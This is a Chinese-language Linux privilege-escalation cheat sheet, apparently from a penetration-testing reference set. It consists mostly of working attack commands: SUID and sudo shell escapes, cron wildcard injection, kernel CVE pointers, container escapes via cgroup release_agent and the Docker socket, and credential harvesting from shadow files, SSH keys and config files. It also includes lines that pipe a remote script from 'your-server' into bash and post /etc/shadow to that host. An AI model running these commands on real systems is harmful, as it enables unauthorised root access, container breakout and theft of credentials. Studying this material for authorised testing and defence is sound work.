# Linux 提权实战参考
- 提权后凭据获取 → `post-credentials.md`
- 域渗透横向移动 → `post-ad.md`

> 流程: 信息收集 → 自动审计 → SUID → Sudo → Cron → 内核 → 密码/密钥 → Capabilities → 服务

> **last_updated**: 2026-06-04 | **tested_against**: Linux 5.x/6.x, Ubuntu 22.04, CentOS 8, GTFOBins
---

## 1. 拿到 Shell 后第一步 — 信息收集

### 1.1 基础信息收集脚本（一次性）

```bash
# 一键信息收集
id; whoami; hostname; uname -a; cat /etc/*release; cat /proc/version
ip a; ifconfig; route -n; arp -a; cat /etc/hosts
ls -la /home; cat /etc/passwd; cat /etc/shadow 2>/dev/null
ps aux; netstat -tlnp; ss -tlnp
sudo -l; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null
crontab -l; cat /etc/crontab; ls -la /etc/cron*
env; cat /etc/environment
ls -la /tmp; ls -la /dev/shm; ls -la /var/tmp
```

### 1.2 自动化审计工具

```bash
# LinPEAS (推荐) — 最全面的Linux提权信息收集
curl -L http://your-server/linpeas.sh | bash
./linpeas.sh -a   # 全面检测

# LinEnum — 轻量级
# linux-exploit-suggester — 内核漏洞建议
./linux-exploit-suggester.sh
# linux-exploit-suggester-2 — 更准的内核+版本匹配
./linux-exploit-suggester-2.pl
```

---

## 2. SUID 提权

### 2.1 查找 SUID 文件

```bash
# 基本查找
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# 排除常见系统文件, 只找可疑的
find / -perm -4000 -type f ! -path '/usr/*' ! -path '/bin/*' ! -path '/sbin/*' 2>/dev/null
```

### 2.2 常见 SUID 利用 (参考 GTFObins)

```bash
# === find ===
find . -exec /bin/sh -p \; -quit

# === bash (少见但存在) ===
bash -p

# === vim ===
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh")'
# 或
vim -c ':!/bin/sh'

# === less / more ===
less /etc/passwd
# 交互模式: !/bin/sh

# === awk ===
awk 'BEGIN {system("/bin/sh")}'

# === systemctl (如果 suid) ===
TF=$(mktemp).service; echo '[Service] Type=oneshot; ExecStart=/bin/sh -c "cp /bin/sh /tmp/sh && chmod u+s /tmp/sh"; [Install] WantedBy=multi-user.target' > $TF; systemctl link $TF; systemctl enable --now $TF; /tmp/sh -p

# === python / python3 ===
python3 -c 'import os;os.execl("/bin/sh","sh","-p")'

# === cp / mv (如果SUID) ===
cp /bin/sh /tmp/sh && chmod u+s /tmp/sh

# === mount ===
# 如果挂载可取:
mount -o bind /bin/sh /bin/mount && mount

# === aria2c ===
aria2c --allow-overwrite=true --out=shadow /etc/shadow
# → 下载后破解hash

# === tar ===
# 创建含 SUID shell 的 tar, 解压到 cron 目录等
tar cf - --checkpoint=1 --checkpoint-action=exec=/bin/sh

# === 更多参见 GTFObins: https://gtfobins.github.io/
```

---

## 3. Sudo 提权

### 3.1 检查 sudo 权限

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/find     → 可利用
# (root) NOPASSWD: ALL                → 直接 sudo su
# (root) NOPASSWD: /usr/bin/vim       → 可利用
```

### 3.2 常见 sudo 利用 (GTFObins)

```bash
# === find ===
sudo find . -exec /bin/sh \; -quit

# === vim ===
sudo vim -c ':!/bin/sh'

# === less / more ===
sudo less /etc/passwd
# 交互: !/bin/sh

# === nano ===
# Ctrl+R Ctrl+X → 输入命令

# === awk ===
sudo awk 'BEGIN {system("/bin/sh")}'

# === perl ===
sudo perl -e 'exec "/bin/sh";'

# === python3 ===
sudo python3 -c 'import os; os.system("/bin/sh")'

# === tcpdump ===
# (当可以用tcpdump时)
# 创建脚本 echo "cp /bin/sh /tmp/sh; chmod u+s /tmp/sh" > /tmp/.x
# sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/.x -Z root

# === nmap ===
sudo nmap --script http-vuln-cve2014-3704.nse   # 老版本nmap有! 功能
# nmap > 5.21: !/bin/sh (交互模式)

# === zip ===
TF=$(mktemp -u); sudo zip $TF /etc/hosts -T -TT '/bin/sh -i' # 读不到/tmp下的文件所以saved文件会写进去但是执行不成功

# === apache2 ===
sudo apache2 -f /etc/shadow   # 输出shadow内容(启动失败打印)

# === wget ===
sudo wget --post-file=/etc/shadow http://your-server/

# === git ===
sudo git -c core.pager='sh -c "id>/tmp/pwned"' help
# 或者:
sudo git -p help
# 内置PAGER中: !/bin/sh
```

---

## 4. Cron 提权

### 4.1 检查 Cron 任务

```bash
crontab -l                 # 当前用户
cat /etc/crontab           # 系统 crontab
ls -la /etc/cron*          # 所有 cron 目录
systemctl list-timers      # systemd timer
```

### 4.2 Cron 利用方式

```bash
# 方式1: 可写 cron 脚本
find /etc/cron* -writable 2>/dev/null
# 找到后: echo "cp /bin/sh /tmp/sh; chmod u+s /tmp/sh" >> /etc/cron.hourly/backup.sh

# 方式2: 通配符注入 (tar/rsync)
# 如果 cron 执行类似: cd /backup && tar -cf /tmp/backup.tar *
# 创建文件:
echo "cp /bin/sh /tmp/sh; chmod u+s /tmp/sh" > /backup/--checkpoint=1
echo "" > /backup/--checkpoint-action=exec=sh\ shell.sh

# 方式3: PATH 劫持
# cron 可能用相对路径调用脚本 → 在可写目录创建同名脚本
# 检查 cron 脚本的 PATH= 值

# 方式4: 环境变量注入
# cron 脚本如果有环境变量未加引号:
# /path/to/script $DIR
# → 如果 DIR 可控 → 注入
```

---

## 5. 内核漏洞提权

### 5.1 版本识别与匹配

```bash
uname -a                   # 内核版本
cat /etc/*release          # 发行版+版本
cat /proc/version

# → 输入到 linux-exploit-suggester 或 searchsploit
searchsploit linux kernel 4.15 --exclude="dos" | grep -v "windows"
```

### 5.2 经典内核提权 CVE

| CVE | 影响 | 一句话 |
|-----|------|--------|
| **CVE-2016-5195** (DirtyCow) | 2.6.22-4.8.3 | /etc/passwd 追加root用户 |
| **CVE-2022-0847** (DirtyPipe) | 5.8-5.16.11 | 覆写任意只读文件 |
| **CVE-2021-4034** (PwnKit) | pkexec < 0.105 | 默认安装，几乎必中 |
| **CVE-2021-3156** (Baron Samedit) | sudo 1.8.2-1.8.31p2, 1.9.0-1.9.5p1 | sudo版本 → 堆溢出提权 |
| **CVE-2019-13272** | 低版本内核 | ptrace_traceme |
| **CVE-2017-1000112** | 低版本内核 | UDP溢出 |
| **CVE-2014-4014** | 低版本内核 | overlayfs |

### 5.3 PwnKit (CVE-2021-4034) 速查

```bash
# 影响: pkexec (polkit) 默认安装的几乎所有 Linux
# 检测:
which pkexec
# 利用:
# 编译 PwnKit POC → ./pwnkit
# 或: 用 Python 版本:
python3 -c "..."   # 各大GitHub有现成POC
```

### 5.4 DirtyPipe (CVE-2022-0847) 速查

```bash
# 影响: Linux 5.8 - 5.16.11
uname -r | grep -E '^5\.(8|9|1[0-6])'
# 利用:
# 可直接覆写 /etc/passwd → 添加root用户
# 或修改 SUID 二进制 → 注入 shellcode
```

---

## 6. 密码/凭据窃取

```bash
# === 历史记录 ===
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history
cat /root/.bash_history 2>/dev/null
cat /home/*/.bash_history 2>/dev/null

# === 配置文件中的密码 ===
grep -rn "password" /var/www/html/ 2>/dev/null
grep -rn "passwd" /etc/ 2>/dev/null | grep -v ":#"
grep -rn "DB_PASSWORD" /var/www/ 2>/dev/null

# === 常见凭据位置 ===
cat /etc/fstab                    # 挂载的凭据
cat /etc/knockd.conf              # port knocking 配置
cat ~/.ssh/id_rsa                 # SSH私钥
cat ~/.ssh/authorized_keys        # 授权的公钥→可能可写
cat /var/log/auth.log             # 认证日志→可能含密码
cat ~/.git-credentials            # Git凭据
cat ~/.docker/config.json         # Docker Registry 凭据

# === 备份文件 ===
ls -la /var/backups/
ls -la /tmp/ | grep -E '\.sql|\.bak|\.tar|\.gz|\.zip'
```

---

## 7. Capabilities

```bash
# 查找有特殊 Capabilities 的文件
getcap -r / 2>/dev/null

# 常见利用:
# cap_setuid+ep     → python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# cap_dac_read_search → 读取 /etc/shadow 等受限文件
# cap_sys_ptrace    → 注入到 root 进程
# cap_net_raw+ep    → tcpdump 抓包 (非直接提权, 但可能抓到凭据)
```

---

## 8. Docker / LXC 逃逸

```bash
# === 判断是否在容器内 ===
cat /proc/1/cgroup | grep docker   # 含 docker → 在容器内
ls -la /.dockerenv                  # 存在 → 在Docker容器内

# === 特权容器逃逸 ===
# 挂载宿主机磁盘:
fdisk -l
mkdir /tmp/host; mount /dev/sda1 /tmp/host
chroot /tmp/host /bin/bash

# cgroup 逃逸 (需 privileged + SYS_ADMIN)
mkdir /tmp/cgrp; mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cp /bin/sh /tmp/sh; chmod u+s /tmp/sh" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
/tmp/sh

# === Docker Socket 逃逸 ===
# 如果容器内存在 /var/run/docker.sock:
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/sh
```

---

## 9. 快速检查清单

```bash
# 拿了 shell 后按这个顺序跑:
# 1. sudo -l                         ← 秒出结果, 最高优先级
# 2. find / -perm -4000 2>/dev/null  ← SUID
# 3. getcap -r / 2>/dev/null         ← Capabilities
# 4. cat /etc/crontab                ← Cron
# 5. crontab -l
# 6. uname -a                        ← 内核版本
# 7. ps aux                          ← 进程(看root跑的服务)
# 8. netstat -tlnp                   ← 网络服务(本地提权跳板)
# 9. cat ~/.bash_history             ← 密码/凭据
# 10. grep -rn "pass" /var/www/ 2>/dev/null ← Web应用凭据
```

---
## 相关参考
- 提权后凭据获取 → `post-credentials.md`
- 域渗透横向移动 → `post-ad.md`

*参考: GTFObins + HackTricks + PayloadAllTheThings + 实战案例*
